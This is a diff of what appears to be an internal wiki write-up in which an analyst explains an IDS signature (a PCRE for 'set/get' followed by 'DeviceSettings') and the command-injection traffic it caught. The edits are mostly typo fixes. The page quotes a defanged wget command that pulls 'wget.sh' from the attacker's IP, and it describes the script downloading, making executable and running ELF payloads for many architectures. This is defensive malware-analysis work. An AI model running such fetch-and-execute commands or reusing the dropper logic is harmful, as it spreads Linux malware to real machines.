@@ -30,11 +30,12 @@
 ![image.png](/.attachments/image-532e61cd-c386-43e3-88e5-dcbf6874e550.png)
     
 
-12.  We then see some pcre regex essentially looking for either "set" or "get" pcre:"/^(?:set|get)/Ri"
+12.  We then see some pcre regex essentially looking for either "set" or "get" not dependent on case. 
+```pcre:"/^(?:set|get)/Ri"```
 13. Right after the PCRE we see another content match looking for "DeviceSettings" This is followed by a distance modifier of "within: 14. This is best explained with another picture
 ![image.png](/.attachments/image-c6c457e7-6c99-49f2-9ec6-97adf0a4f158.png)
 
-13. Thats it for the logic of the rule. Following the logic we have some reference links, the classtype(which signifies which kind of attack it is),  Signature ID(SID), the revision number, and some metadata which tells us when it was created or modified. 
+13. That's it for the logic of the rule. Following the logic we have some reference links, the classtype(which signifies which kind of attack it is),  Signature ID(SID), the revision number, and some metadata which tells us when it was created or modified. 
 ### The Traffic it matched on
 
 ![image.png](/.attachments/image-e052bfb3-7be3-4d92-9713-607756a2e185.png)
@@ -58,11 +59,11 @@ This looks like a rather simple command injection.
 - We then see it use sh to execute wget.sh and it follows it all up by deleting itself. 
 
 
-### Whats in wget.sh?
+### What's in wget.sh?
 
 - To find this out we need to fire up a VM (behind a VPN) and wget this wget.sh script from the attacker webserver. 
     - To that end we can just run the same command (defanged of course)
-    - Becareful from here on out. The ELF we eventually will grab can infect linux machines. Only  do this on a machine you can blow up and walk away from or reset. 
+    - Be careful from here on out. The ELF we eventually will grab can infect linux machines. Only  do this on a machine you can blow up and walk away from or reset. 
 ```
 wget http://23.94.22[.]13/a/wget.sh
 ```
@@ -70,9 +71,9 @@ wget http://23.94.22[.]13/a/wget.sh
 
 ![wget_sh.png](/.attachments/wget_sh-de81ca11-748b-49d0-ba8f-dc57f28ea875.png)
 
-- Gnarly. Whats this thing trying to do? its rather simple. Its using wget to pull down the secondary payload, changing the permissions on it and executing it. It doesn't know the operating CPU so its trying from ARM to x86_64. It tries to install them all. 
+- Gnarly. What's this thing trying to do? its rather simple. Its using wget to pull down the secondary payload, changing the permissions on it and executing it. It doesn't know the operating CPU so its trying from ARM to x86_64. It tries to install them all. 
 
-### Whats the secondary payload?
+### What's the secondary payload?
 
 - Lets find out by utilizing wget to pull it down
 
